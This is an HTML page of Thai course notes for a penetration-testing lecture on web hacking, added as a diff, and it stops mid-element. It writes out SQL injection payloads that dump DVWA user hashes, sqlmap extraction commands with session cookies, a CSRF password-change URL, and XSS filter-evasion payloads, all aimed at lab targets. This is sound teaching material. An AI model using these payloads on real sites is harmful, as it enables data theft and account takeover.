@@ -1,0 +1,671 @@
+<!doctype html>
+<html lang="th">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Lecture 8 - Web Hacking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="nav-inner">
+        <a href="index.html" class="brand"><img src="icon.jpg" alt="PenTest Logo" class="brand-logo" />Roadmap</a>
+        <div class="nav-item">
+          <span class="nav-label" tabindex="0">Midterm</span>
+          <div class="nav-drop">
+            <a href="summary1.html">S1 · สรุป A4 L1–L3</a>
+            <a href="summary2.html">S2 · สรุป A4 L4–L6</a>
+            <a href="summary1a.html">S1A · ทฤษฎีสอบข้อเขียน (L1–L6)</a>
+            <a href="summary2a.html">S2A · Command/Lab Steps (L1–L6)</a>
+            <a href="L1.html">L1 · Foundation &amp; Methodology</a>
+            <a href="L2.html">L2 · Reconnaissance &amp; Linux</a>
+            <a href="L3.html">L3 · Scanning (Nmap)</a>
+            <a href="L4.html">L4 · Enumeration</a>
+            <a href="L5.html">L5 · Vulnerability Assessment</a>
+            <a href="L6.html">L6 · Exploitation</a>
+          </div>
+        </div>
+        <div class="nav-item">
+          <span class="nav-label active" tabindex="0">Final</span>
+          <div class="nav-drop">
+            <a href="summary3.html">S3 · สรุป A4 L7–L9</a>
+            <a href="summary4.html">S4 · สรุป A4 L10–L11</a>
+            <a href="summary3a.html">S3A · Command/Lab Steps (L7–L9)</a>
+            <a href="summary4a.html">S4A · Command/Lab Steps (L10–L11)</a>
+            <a href="L7.html">L7 · Password Cracking</a>
+            <a href="L8.html" class="active">L8 · Web Hacking</a>
+            <a href="L9.html">L9 · Reverse Engineering</a>
+            <a href="L10.html">L10 · Penetration Testing Report</a>
+            <a href="L11.html">L11 · Incident Response</a>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <main class="a4">
+      <h1>สรุปเนื้อหาและปฏิบัติการ Lecture 8: Web Hacking</h1>
+      <p style="color: #e74c3c; font-weight: bold; text-align: center;">#ออกสอบ Final</p>
+      <p class="subtitle">
+        วิชา Penetration Testing and Protection (0406136051) — DVWA · SQL Injection ·
+        sqlmap · CSRF · XSS · Burp Suite
+      </p>
+
+      <p>
+        <strong>Web Hacking</strong> คือการเจาะช่องโหว่ที่ตัว
+        <strong>Web Application</strong> เอง (ไม่ใช่แค่ port/service เหมือน Lecture
+        ก่อนๆ) เป้าหมายคือข้อมูลใน Database, session ของผู้ใช้ และการยึดควบคุมเว็บไซต์
+        — คลาสสิกที่ต้องรู้คือ 3 ตัวนี้: <strong>SQL Injection</strong> (แทรกคำสั่ง SQL),
+        <strong>XSS</strong> (แทรก script), <strong>CSRF</strong> (บังคับให้เหยื่อทำ action)
+        ซึ่งล้วนอยู่ใน OWASP Top 10
+      </p>
+
+      <h2>1. DVWA — สนามซ้อมเว็บที่จงใจทำให้พัง</h2>
+      <p>
+        <strong>Damn Vulnerable Web Application (DVWA)</strong> คือเว็บแอป
+        PHP/MySQL ที่ถูกออกแบบมาให้<strong>มีช่องโหว่โดยเจตนา</strong>
+        เพื่อให้ pentester, web developer และ security professional
+        ฝึกโจมตีและเรียนรู้วิธีป้องกันได้จริง ในสภาพแวดล้อมที่ปลอดภัยและถูกกฎหมาย
+      </p>
+      <table>
+        <tr>
+          <th>ขั้นตอน</th>
+          <th>คำสั่ง / รายละเอียด</th>
+        </tr>
+        <tr>
+          <td><strong>ติดตั้ง</strong></td>
+          <td><code>sudo apt install dvwa</code> (หรือใช้ Docker image ตามที่อาจารย์แนะนำ)</td>
+        </tr>
+        <tr>
+          <td><strong>เริ่มระบบ</strong></td>
+          <td><code>dvwa-start</code></td>
+        </tr>
+        <tr>
+          <td><strong>Login เริ่มต้น</strong></td>
+          <td>username <code>admin</code> / password <code>password</code></td>
+        </tr>
+      </table>
+
+      <h3>1.1 ระดับความปลอดภัย (DVWA Security Levels)</h3>
+      <p>
+        DVWA ให้เลือก 4 ระดับความยาก — <strong>จุดสำคัญคือ payload ที่ใช้ได้ในระดับ Low
+        จะใช้ไม่ได้ในระดับ Medium/High</strong> ทำให้ได้เรียนรู้เทคนิค bypass ทีละขั้น
+      </p>
+      <table>
+        <tr>
+          <th>ระดับ</th>
+          <th>ความหมาย</th>
+        </tr>
+        <tr>
+          <td><strong>Low</strong></td>
+          <td>ค่าเริ่มต้นของ Docker — ไม่มีมาตรการป้องกันใดๆ เลย (vulnerable ที่สุด ใช้เรียนหลักการ)</td>
+        </tr>
+        <tr>
+          <td><strong>Medium</strong></td>
+          <td>สาธิต <em>bad security practices</em> — นักพัฒนาพยายามป้องกันแล้วแต่ยังทำไม่ถูกต้อง</td>
+        </tr>
+        <tr>
+          <td><strong>High</strong></td>
+          <td>ต่อยอดจาก Medium — ผสมการป้องกันที่ยากขึ้นหรือเป็น "ทางเลือกที่แย่" มีขีดจำกัดการโจมตีคล้ายสนาม CTF</td>
+        </tr>
+        <tr>
+          <td><strong>Impossible</strong></td>
+          <td>ปลอดภัยจริง (ค่าเริ่มต้นของ Kali) — ใช้เป็นตัวอย่างว่าการป้องกันที่ถูกต้องเป็นอย่างไร</td>
+        </tr>
+      </table>
+      <p>
+        เมนูด้านซ้ายคือบทเรียน/โจทย์ (lessons/challenges) โดยมีปุ่มสำคัญ 2 ปุ่ม:
+        <strong>View Source</strong> (ดู PHP source ของหน้านั้นเพื่อวิเคราะห์กลยุทธ์)
+        และ <strong>View Help</strong> (อธิบายว่าโจมตีทำไมได้ และควรเห็นอะไรเมื่อเปลี่ยนระดับความยาก)
+      </p>
+      <div class="note">
+        <strong>ช่องโหว่ใน DVWA:</strong> Brute-force · Command Injection · CSRF · File Inclusion ·
+        File Upload · Insecure CAPTCHA · SQL Injection · Blind SQLi · Weak Session IDs ·
+        XSS (DOM / Reflected / Stored) · CSP Bypass · JavaScript · Open HTTP Redirect
+      </div>
+      <div class="tip">
+        <strong>เครื่องมือที่ใช้คู่กับ DVWA:</strong> Nmap (หาบริการก่อน) · Wireshark (ดัก packet) ·
+        sqlmap (SQLi อัตโนมัติ) · John the Ripper / Hydra (แคร็ก credential) · Social Engineer Toolkit ·
+        Metasploit · Burp Suite (ดัก/แก้ request)
+      </div>
+
+      <h2>2. SQL Injection — หลักการและการพิสูจน์ช่องโหว่</h2>
+      <p>
+        <strong>SQL Injection (SQLi)</strong> = ช่องโหว่ที่เปิดให้ attacker
+        <strong>แทรกคำสั่ง SQL เข้าไปใน query ของแอปพลิเคชัน</strong> ทำให้สามารถดู แก้ไข
+        หรือลบข้อมูลที่ไม่มีสิทธิ์เข้าถึงได้ — รวมถึงข้อมูลของผู้ใช้คนอื่นจาก Database
+      </p>
+
+      <h3>2.1 Entry Point Detection — หาจุดที่แทรกได้</h3>
+      <p>
+        เมื่อเว็บตอบสนองผิดปกติต่อ input ที่เป็น SQL ขั้นแรกคือ
+        <strong>หาวิธี "หนีออก" (escape) จาก context ปัจจุบัน</strong> ให้ query ยังทำงานได้
+        โดยไม่พัง แล้วปิดท้ายด้วย <strong>comment symbol</strong> เพื่อตัดส่วนที่โค้ดเดิมต่อท้ายอยู่
+      </p>
+      <p>ตัวอย่าง escape characters ที่ใช้บ่อย: <code>'</code> · <code>"</code> · <code>`</code> · <code>)</code> · <code>')</code> · <code>")</code> · <code>`)</code> · <code>'))</code> · <code>"))</code> · <code>`))</code></p>
+      <table>
+        <tr>
+          <th>DBMS</th>
+          <th>Comment Syntax</th>
+        </tr>
+        <tr>
+          <td><strong>MySQL</strong></td>
+          <td><code>#comment</code> · <code>-- comment</code> (ต้องมี space หลัง <code>--</code>) · <code>/*comment*/</code> · <code>/*! MySQL Special SQL */</code></td>
+        </tr>
+        <tr>
+          <td><strong>PostgreSQL</strong></td>
+          <td><code>--comment</code> · <code>/*comment*/</code></td>
+        </tr>
+        <tr>
+          <td><strong>MSSQL</strong></td>
+          <td><code>--comment</code> · <code>/*comment*/</code></td>
+        </tr>
+        <tr>
+          <td><strong>Oracle</strong></td>
+          <td><code>--comment</code></td>
+        </tr>
+        <tr>
+          <td><strong>SQLite</strong></td>
+          <td><code>--comment</code> · <code>/*comment*/</code></td>
+        </tr>
+      </table>
+
+      <h3>2.2 Confirming with Logical Operations — ยืนยันด้วยตรรกะ</h3>
+      <ul>
+        <li>
+          <strong>ทดสอบด้วย tautology:</strong> ถ้า <code>?username=Peter</code> กับ
+          <code>?username=Peter' or '1'='1</code> ให้ผลลัพธ์เหมือนกัน → สงสัย SQLi ทันที
+          (เพราะ <code>'1'='1</code> เป็นจริงเสมอ = คืนทุกแถว)
+        </li>
+        <li>
+          <strong>ทดสอบด้วยคณิตศาสตร์:</strong> ถ้า <code>?id=1</code> กับ <code>?id=2-1</code>
+          ให้ผลเหมือนกัน → ยืนยันว่า input ถูกคำนวณเป็น SQL จริง ไม่ใช่ข้อความธรรมดา
+        </li>
+      </ul>
+      <div class="tip">
+        <strong>หลักคิดสำคัญ:</strong> ช่องโหว่นี้เกิดจากโปรแกรมนำ input ของเราไป
+        <strong>ต่อเป็นสตริงของ SQL ตรงๆ</strong> (string concatenation) — สิ่งที่เราพิมพ์จึงกลายเป็น
+        "โค้ด" ไม่ใช่ "ข้อมูล" ถ้าเขาใช้ Prepared Statement / Parameterized Query ปัญหานี้จะหายไป
+      </div>
+
+      <h3>2.3 ตัวอย่างจริงบน DVWA (ระดับ Low)</h3>
+      <p>ที่ช่อง User ID กรอก:</p>
+      <ul>
+        <li>
+          <code>%' or '0'='0</code> — โค้ด PHP จะสร้าง query เป็น:<br />
+          <code>SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';</code><br />
+          โดย <code>%</code> เป็น wildcard, <code>'0'='0'</code> เป็น tautology ทำให้ได้ข้อมูลผู้ใช้ทั้ง 5 คน
+        </li>
+        <li><code>' or 1=1#</code> หรือ <code>1' OR '1'='1'#</code> — วิธี tautology แบบสั้น</li>
+      </ul>
+      <div class="warn">
+        <strong>บทเรียน:</strong> ถ้า tautology ผ่านได้ แปลว่า SQL keyword ใดๆ
+        ก็ถูกนำไปรันได้เช่นกัน — ต่อไปคือ "ขอดูข้อมูลจริงจากตารางอื่น"
+      </div>
+
+      <h2>3. SQL Injection — UNION-Based Injection</h2>
+      <p>
+        <strong>UNION</strong> เป็นคำสั่ง SQL ที่<strong>รวมผลลัพธ์ของ 2 query เข้าด้วยกัน</strong>
+        ผู้โจมตีใช้ต่อ query อันตรายของตัวเองเข้าไปกับ query ที่ถูกต้องของเว็บ
+        เพื่อขโมยข้อมูลจากตารางอื่น
+      </p>
+      <div class="note">
+        <strong>เงื่อนไขบังคับของ UNION:</strong> ทั้ง 2 query ต้องคืน
+        <strong>จำนวนคอลัมน์เท่ากัน</strong> (และชนิดข้อมูลเข้ากันได้) — จึงต้องนับคอลัมน์ให้ได้ก่อนเสมอ
+      </div>
+
+      <h3>3.1 หาจำนวนคอลัมน์ (Detecting Number of Columns)</h3>
+      <table>
+        <tr>
+          <th>วิธี</th>
+          <th>ทำอย่างไร</th>
+        </tr>
+        <tr>
+          <td><strong>ORDER BY / GROUP BY</strong></td>
+          <td>
+            เพิ่มตัวเลขไปเรื่อยๆ เช่น <code>1' ORDER BY 1#</code> → <code>2</code> → <code>3</code>… จนกว่า
+            จะ error — จำนวนคอลัมน์จริง = ค่าสุดท้ายที่ยัง<strong>ไม่</strong> error
+          </td>
+        </tr>
+        <tr>
+          <td><strong>UNION SELECT NULL</strong></td>
+          <td>
+            ใส่ <code>null</code> เพิ่มทีละตัวจน query ถูกต้อง:<br />
+            <code>1' UNION SELECT null --</code> → <code>1' UNION SELECT null, null --</code>
+          </td>
+        </tr>
+      </table>
+
+      <h3>3.2 ลำดับการโจมตีบน DVWA (Low)</h3>
+      <ol>
+        <li>
+          <strong>ยืนยันช่องโหว่:</strong> <code>%' or '0'='0</code> (จากข้อ 2.3) แล้วหาจำนวนคอลัมน์ด้วย
+          ORDER BY (query เดิมคืน 2 คอลัมน์: first_name, last_name)
+        </li>
+        <li>
+          <strong>สำรวจโครงสร้าง DB ผ่าน metadata:</strong><br />
+          <code>%' UNION SELECT table_name,column_name FROM information_schema.columns #</code><br />
+          หรือดูรายชื่อตารางทั้งหมด: <code>' union select table_name,null from information_schema.tables#</code>
+        </li>
+        <li>
+          <strong>ขโมย credential ของทุก user:</strong><br />
+          <code>%' UNION SELECT user, password FROM users #</code><br />
+          ผลลัพธ์คือ username คู่กับ <strong>MD5 hash</strong> เช่น
+          <code>admin: 5f4dcc3b5aa765d61d8327deb882cf99</code>,
+          <code>gordonb: e99a18c428cb38d5f260853678922e03</code>, <code>1337: 8d3533d75ae2c3966d7e0d4fcc69216b</code>
+        </li>
+      </ol>
+      <div class="tip">
+        <strong>เกร็ด:</strong> <code>information_schema</code> คือ metadata ของ MySQL
+        ที่บอกชื่อ database/table/column ทั้งหมด — เป็น "แผนที่สมบัติ" ของ attacker
+        และ hash ที่ได้เป็น MD5 เอาไปแคร็กต่อด้วย John the Ripper หรือ Hashcat ได้ทันที (ดู Lecture 7)
+      </div>
+
+      <h2>4. SQL Injection — Error-Based และ Blind Injection</h2>
+
+      <h3>4.1 Error-Based Injection</h3>
+      <p>
+        ใช้เมื่อ<strong>ไม่เห็นผลลัพธ์ของ query แต่เห็นข้อความ error</strong> — attacker
+        จงใจทำให้เกิด error ที่ฝังข้อมูลจาก DB ไว้ในข้อความ error แล้วอ่านค่าจากตรงนั้น
+      </p>
+      <table>
+        <tr>
+          <th>ลำดับเหตุการณ์</th>
+          <th>ผู้เกี่ยวข้อง</th>
+        </tr>
+        <tr>
+          <td>1. ส่ง malicious input</td>
+          <td>Attacker → Web App</td>
+        </tr>
+        <tr>
+          <td>2. สร้าง SQL query ส่งไป Database</td>
+          <td>Web App → Database Server</td>
+        </tr>
+        <tr>
+          <td>3. Database ตอบกลับ (หรือเกิด error)</td>
+          <td>Database → Web App</td>
+        </tr>
+        <tr>
+          <td>4. แสดง error message ที่ attacker ตีความได้</td>
+          <td>Web App → Attacker</td>
+        </tr>
+      </table>
+      <p>
+        แนวคิด payload คือบังคับให้ query เกิด duplicate key error
+        โดยเอา data ที่ต้องการ (เช่น version) ไปต่อกับค่าที่ชนกัน เช่นใช้
+        <code>row()</code>, <code>count(*)</code>, <code>concat()</code> ร่วมกับ
+        <code>floor(rand()*2)</code> — ข้อมูลจะโผล่มาในข้อความ error เอง
+      </p>
+
+      <h3>4.2 Blind Injection — เมื่อมองไม่เห็นผลลัพธ์</h3>
+      <p>
+        Blind SQLi = ดึงข้อมูลไม่ได้ตรงๆ ต้อง<strong>อนุมานจากพฤติกรรมของระบบ</strong>
+        (เหมือนถามคำถาม yes/no ทีละข้อ) มี 2 เทคนิคหลัก:
+      </p>
+      <table>
+        <tr>
+          <th>เทคนิค</th>
+          <th>หลักการ</th>
+          <th>ตัวอย่างบน DVWA</th>
+        </tr>
+        <tr>
+          <td><strong>Boolean-based</strong></td>
+          <td>หน้าเว็บเปลี่ยนไปตามผลจริง/เท็จของเงื่อนไข</td>
+          <td><code>2' AND 1=1#</code> (จริง — หน้าปกติ) vs <code>2' AND 1=0#</code> (เท็จ — หน้าเปลี่ยน)</td>
+        </tr>
+        <tr>
+          <td><strong>Timing-based</strong></td>
+          <td>วัดเวลาตอบสนอง — ถ้า delay ตามที่สั่ง = คำสั่งถูก execute จริง</td>
+          <td><code>2' AND SLEEP(5)#</code> — ถ้าหน้าค้าง ~5 วินาที = vulnerable</td>
+        </tr>
+      </table>
+      <p><strong>ขั้นตอน Blind บน DVWA (จากสไลด์):</strong></p>
+      <ol>
+        <li><strong>Simple test:</strong> ใส่ <code>2'#</code> — ถ้าเกิด error หรือ behavior เปลี่ยน = น่าสงสัย</li>
+        <li><strong>True/False test:</strong> เปรียบเทียบ <code>2' AND 1=1#</code> กับ <code>2' AND 1=0#</code></li>
+        <li><strong>Timing test:</strong> <code>2' AND SLEEP(5)#</code> เทียบเวลาตอบสนอง</li>
+        <li>
+          <strong>หาจำนวนคอลัมน์:</strong> <code>2' ORDER BY X#</code> เพิ่ม X จน behavior เปลี่ยน —
+          (จากสไลด์: ทดสอบ X=3 แล้ว error → สรุปว่ามี 2 คอลัมน์)
+        </li>
+        <li>
+          <strong>หาความยาวชื่อ Database:</strong> <code>2' AND LENGTH(DATABASE())=X#</code>
+          ไล่ X จนผลเปลี่ยน (สไลด์: เปลี่ยนที่ X=4 → ชื่อ DB ยาว 4 ตัวอักษร)
+        </li>
+      </ol>
+      <div class="tip">
+        <strong>เกร็ด:</strong> Blind SQLi ต้องถามทีละตัวอักษร (เดาความยาว → เดาทีละตัว) —
+        ใช้เวลามาก ดังนั้นในงานจริงมักใช้ <strong>sqlmap</strong> automate ให้
+      </div>
+
+      <h2>5. sqlmap — Automate SQL Injection</h2>
+      <p>
+        <strong>sqlmap</strong> คือเครื่องมือ open source สำหรับ
+        <strong>ตรวจจับและโจมตี SQL injection อัตโนมัติ</strong> รวมถึงยึดควบคุม database server
+        ความสามารถเด่น:
+      </p>
+      <ul>
+        <li>รองรับครบ 6 เทคนิค: boolean-based blind · time-based blind · error-based · UNION query-based · stacked queries · out-of-band</li>
+        <li>ต่อ database ตรงๆ ได้ด้วย credential (ไม่ต้องผ่านช่องโหว่)</li>
+        <li>enumerate ได้ทั้ง users, password hashes, privileges, roles, databases, tables, columns</li>
+      </ul>
+
+      <h3>5.1 เตรียมตัว: หา Session ID (PHPSESSID)</h3>
+      <p>
+        DVWA บังคับ login ก่อนเสมอ — คำสั่ง sqlmap จึงต้องแนบ cookie ไปด้วย:
+        เปิด <strong>DevTools (F12)</strong> → แท็บ <strong>Application</strong> (Chrome) หรือ
+        <strong>Storage</strong> (Firefox) → <strong>Cookies</strong> → หา <code>PHPSESSID</code>
+        ค่าที่อยู่ข้างๆ คือ session ID ของเรา
+      </p>
+
+      <h3>5.2 คำสั่งหลัก (จากสไลด์)</h3>
+      <table>
+        <tr>
+          <th>ขั้น</th>
+          <th>คำสั่ง</th>
+        </tr>
+        <tr>
+          <td><strong>ยิงพื้นฐาน (GET)</strong></td>
+          <td><code>sqlmap -u "http://&lt;IP&gt;/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=medium;PHPSESSID=&lt;session_id&gt;"</code></td>
+        </tr>
+        <tr>
+          <td><strong>ฟอร์มแบบ POST</strong></td>
+          <td>เพิ่ม <code>--data="id=1&amp;Submit=Submit" -p id</code> ระบุพารามิเตอร์ที่ทดสอบ</td>
+        </tr>
+        <tr>
+          <td><strong>ดูรายชื่อ Database</strong></td>
+          <td>ต่อท้ายด้วย <code>--dbs</code> (เช่น <code>-D dvwa</code> เพื่อเจาะจง DB ชื่อ dvwa)</td>
+        </tr>
+        <tr>
+          <td><strong>ดูตารางใน DB</strong></td>
+          <td><code>-D dvwa --tables</code></td>
+        </tr>
+        <tr>
+          <td><strong>ดูคอลัมน์</strong></td>
+          <td><code>-D dvwa --tables users --columns</code></td>
+        </tr>
+        <tr>
+          <td><strong>ดึงข้อมูลทั้งหมด</strong></td>
+          <td><code>-D dvwa --tables users --dump</code></td>
+        </tr>
+      </table>
+      <p>
+        ตัวอย่างเต็ม:<br />
+        <code>sqlmap -u "http://192.168.74.129/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="PHPSESSID=&lt;your_session_id&gt;; security=low" -D dvwa --tables</code>
+      </p>
+      <div class="note">
+        <strong>ผลลัพธ์ถูกเก็บที่:</strong> <code>/home/kali/.local/share/sqlmap/output/&lt;Target_IP&gt;</code> —
+        เปิดไฟล์ <code>session.sqlite</code> ด้วย <code>sqlitebrowser</code> เพื่อดูผลย้อนหลังได้
+      </div>
+      <div class="tip">
+        <strong>เกร็ด:</strong> ค่า <code>security=</code> ใน cookie ต้องตรงกับระดับที่ตั้งใน DVWA
+        (เช่น <code>security=medium</code>) ไม่งั้น sqlmap จะยิง payload ที่ไม่ตรงกับระดับความยากจริง
+      </div>
+
+      <h2>6. CSRF — Cross-Site Request Forgery</h2>
+      <p>
+        <strong>CSRF</strong> คือช่องโหว่ที่ทำให้ attacker
+        <strong>สั่งให้เบราว์เซอร์ของเหยื่อทำ action แทนเหยื่อ</strong>
+        โดยอาศัย session ที่เหยื่อล็อกอินค้างไว้ — เกิดเมื่อเหยื่อเยี่ยมชมเว็บอันตราย
+        แล้วเว็บนั้นยิง request ไปยังบัญชีเหยื่อ (ผ่าน JavaScript / form / img)
+        ซึ่งเบราว์เซอร์จะแนบ cookie ของเหยื่อไปให้อัตโนมัติ
+      </p>
+      <table>
+        <tr>
+          <th>เงื่อนไขที่ต้องมี (Prerequisites)</th>
+          <th>รายละเอียด</th>
+        </tr>
+        <tr>
+          <td><strong>1. Identified valuable action</strong></td>
+          <td>ต้องมี action ที่คุ้มค่าให้โจมตี เช่น เปลี่ยนรหัสผ่าน อีเมล หรือยกระดับสิทธิ์</td>
+        </tr>
+        <tr>
+          <td><strong>2. Session ผ่าน cookie/Basic Auth</strong></td>
+          <td>session ต้องถูกส่งด้วย cookie หรือ HTTP Basic Authentication header เท่านั้น (header อื่นปลอมไม่ได้)</td>
+        </tr>
+        <tr>
+          <td><strong>3. ไม่มี unpredictable parameters</strong></td>
+          <td>request ต้องไม่มีค่าสุ่มที่เดาไม่ได้ — token ป้องกัน CSRF ได้เพราะข้อนี้</td>
+        </tr>
+      </table>
+      <p><strong>ตัวอย่างบน DVWA (Low) — เปลี่ยนรหัสผ่านเหยื่อ:</strong></p>
+      <p>
+        หน้า change password ส่ง <strong>GET request</strong> ที่มีพารามิเตอร์ครบใน URL:
+        <code>http://&lt;IP&gt;/dvwa/vulnerabilities/csrf/?password_new=kmutnb&amp;password_conf=kmutnb&amp;Change=Change#</code>
+      </p>
+      <ul>
+        <li>พารามิเตอร์ 3 ตัว: <code>password_new</code>, <code>password_conf</code>, <code>Change</code></li>
+        <li>
+          ถ้า attacker ล่อให้เหยื่อ<strong>คลิก URL นี้ขณะยังล็อกอินอยู่</strong> →
+          รหัสผ่านของเหยื่อถูกเปลี่ยนทันทีโดยไม่รู้ตัว
+        </li>
+      </ul>
+      <div class="warn">
+        <strong>สังเกต:</strong> ใน URL ไม่มี CSRF token เลย — นี่คือสัญญาณของช่องโหว่
+        และเพราะใช้ GET แค่ฝังรูป/ลิงก์ในหน้าเว็บอันตรายก็เรียกใช้ได้
+      </div>
+
+      <h2>7. XSS — Cross-Site Scripting</h2>
+      <p>
+        <strong>XSS</strong> คือเทคนิคที่ attacker
+        <strong>แทรก script อันตรายเข้าไปในเว็บเป้าหมาย</strong> แล้ว script
+        นั้นถูก execute ที่เบราว์เซอร์ของเหยื่อ — ช่องทางคือ input ที่เว็บไม่ควบคุม เช่น ช่อง comment,
+        username, email
+      </p>
+      <table>
+        <tr>
+          <th>ประเภท</th>
+          <th>กลไก</th>
+          <th>จุดสังเกต</th>
+        </tr>
+        <tr>
+          <td><strong>Reflected (RXSS)</strong></td>
+          <td>script มาจาก HTTP request ปัจจุบัน แล้วสะท้อนกลับไปทันที</td>
+          <td>ไม่ถูกเก็บที่เว็บไซต์ · execute เฉพาะฝั่งเหยื่อที่กดลิงก์</td>
+        </tr>
+        <tr>
+          <td><strong>Stored (SXSS)</strong></td>
+          <td>script ถูกเก็บไว้ในเว็บไซต์/DB แล้วถูกส่งให้ทุกคนที่เปิดหน้านั้น</td>
+          <td>อันตรายสุด — execute บนเครื่องของผู้ใช้ทุกคนโดยอัตโนมัติ</td>
+        </tr>
+        <tr>
+          <td><strong>DOM-based</strong></td>
+          <td>ช่องโหว่อยู่ใน client-side code (JavaScript) ไม่ใช่ฝั่ง server</td>
+          <td>HTTP response ไม่เปลี่ยน — attacker ใช้ DOM objects เช่น <code>document.URL</code>, <code>document.location</code>, <code>document.referrer</code></td>
+        </tr>
+      </table>
+
+      <h3>7.1 Payload ตามระดับความยากของ DVWA</h3>
+      <table>
+        <tr>
+          <th>ประเภท</th>
+          <th>Low</th>
+          <th>Medium (bypass)</th>
+          <th>High (bypass)</th>
+        </tr>
+        <tr>
+          <td><strong>Reflected</strong></td>
+          <td><code>&lt;script&gt;alert("xss")&lt;/script&gt;</code></td>
+          <td><code>&lt;Script&gt;alert("hack by falcon")&lt;/Script&gt;</code> — สลับตัวพิมพ์ใหญ่-เล็กหลบ filter</td>
+          <td><code>&lt;img src=x onerror=alert("falcon")&gt;</code> — ใช้ event handler แทน tag script</td>
+        </tr>
+        <tr>
+          <td><strong>Stored</strong></td>
+          <td><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></td>
+          <td><code>&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
+          <td><code>&lt;body onload=alert("bingo")&gt;</code></td>
+        </tr>
+        <tr>
+          <td><strong>DOM-based</strong></td>
+          <td><code>.../xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          <td><code>.../xss_d/?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code> แล้ว reload</td>
+          <td><code>.../xss_d/?default=English#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> แล้ว reload</td>
+        </tr>
+      </table>
+      <div class="tip">
+        <strong>เกร็ด:</strong> พัฒนาการของ payload ทั้ง 3 ระดับสอนเทคนิค filter evasion:
+        ระดับ Low = payload ตรงๆ · Medium = ใช้อักขระ/ตัวพิมพ์หลบ filter · High =
+        เปลี่ยนกลไกที่ใช้ execute (event handler) — ดูรายละเอียด XSS ใน OWASP Top 10 (2017) A7
+      </div>
+
+      <h2>8. Burp Suite — เครื่องมือดักและแก้ Request</h2>
+      <p>
+        <strong>Burp Suite</strong> คือ Web Proxy ยอดนิยมสำหรับ intercept และแก้ไข HTTP request/response
+        ระหว่างที่เบราว์เซอร์คุยกับเว็บ — ใช้จับ request ที่เราต้องการแล้วดัดแปลงก่อนส่งจริง
+      </p>
+      <table>
+        <tr>
+          <th>ขั้นตอนติดตั้ง/ตั้งค่า</th>
+          <th>รายละเอียด</th>
+        </tr>
+        <tr>
+          <td><strong>ติดตั้ง (Community)</strong></td>
+          <td>ดาวน์โหลด installer → <code>chmod +x burpsuite_community_linux_v2025_7_2.sh</code> → <code>./burpsuite_community_linux_v2025_7_2.sh</code></td>
+        </tr>
+        <tr>
+          <td><strong>ติดตั้งผ่าน Kali (ง่ายสุด)</strong></td>
+          <td><code>sudo apt install burpsuite -y</code> แล้วใช้ <em>Burp's browser</em> ที่ให้มาด้วย</td>
+        </tr>
+        <tr>
+          <td><strong>Proxy ใน Firefox</strong></td>
+          <td>ติดตั้งส่วนขยาย <strong>FoxyProxy</strong> เพื่อเปิด/ปิด proxy สลับกับ Burp ได้เร็ว</td>
+        </tr>
+        <tr>
+          <td><strong>ติดตั้ง CA Certificate</strong></td>
+          <td>
+            เปิด <code>http://burp</code> → คลิก CA Certificate มุมขวาบน (ได้ไฟล์ <code>cacert.der</code>) →
+            ไป Browser Settings → View Certificate → Import certificate
+          </td>
+        </tr>
+        <tr>
+          <td><strong>ทดสอบ</strong></td>
+          <td>เปิด google ใหม่ตอน <em>Intercept on</em> → request ถูกดักมาที่ Burp · กด <em>Intercept off</em> → หน้าเว็บทำงานต่อ</td>
+        </tr>
+      </table>
+      <p>
+        <strong>CA Certificate จำเป็นสำหรับ HTTPS</strong> — ถ้าไม่ติดตั้ง Burp จะอ่าน traffic ที่เข้ารหัสไม่ได้
+        เพราะเบราว์เซอร์จะไม่ยอมรับ certificate ที่ Burp สร้างขึ้นมาแทน
+      </p>
+
+      <h3>8.1 Workflow หลัก: Intercept → Repeater</h3>
+      <ol>
+        <li>เปิด Intercept แล้วทำ action บนเว็บ (เช่นกด add to cart) → request จะถูกดักไว้</li>
+        <li>ดูรายละเอียด request (พารามิเตอร์ ราคา cookie ฯลฯ) — อาจแก้แล้ว forward ต่อได้ทันที</li>
+        <li>ถ้าต้องการทดลองซ้ำ: คลิกขวาที่ request → <strong>Send to Repeater</strong></li>
+        <li>ไปแท็บ Repeater → แก้ค่าที่ต้องการ → กด <strong>Send</strong> → ดู response ด้านขวา</li>
+        <li>กลับไปหน้าเว็บ → <strong>Refresh</strong> → ตรวจสอบว่าเว็บยอมรับค่าที่แก้ไปหรือไม่</li>
+      </ol>
+
+      <h3>8.2 Lab: Business Logic Flaw — เปลี่ยนราคาสินค้า (PortSwigger)</h3>
+      <p>
+        สนามทดลองจาก PortSwigger: <code>https://portswigger.net/web-security/logic-flaws/examples</code>
+        — Login ด้วย <code>wiener / peter</code> จะเห็น Store credit $100 และสินค้า Leather Jacket ราคา $1337.00
+      </p>
+      <ol>
+        <li>เปิด view detail ของสินค้า → เปิด <strong>Intercept on</strong> ใน Burp แล้วกด <strong>add to cart</strong></li>
+        <li>ใน request ที่ดักได้ สังเกตค่า <code>price=133700</code> (หน่วยเป็น cents) — เข้าใจว่าด้วยราคานี้ เงิน $100 ไม่พอ</li>
+        <li>กด Intercept off → สินค้าถูกใส่ตะกร้า → ไป checkout → place order จะเห็นว่าเงินไม่พอ</li>
+        <li>กด remove สินค้าออก แล้วไปที่ request ใน Burp → คลิกขวา → <strong>Send to Repeater</strong></li>
+        <li>ใน Repeater แก้ <code>price</code> ให้เหลือ เช่น <code>1300</code> แล้วกด <strong>Send</strong></li>
+        <li>กลับไปหน้าเว็บ → <strong>Refresh</strong> → ราคาเหลือ $13.00 → <strong>place order</strong> สำเร็จ</li>
+      </ol>
+      <div class="warn">
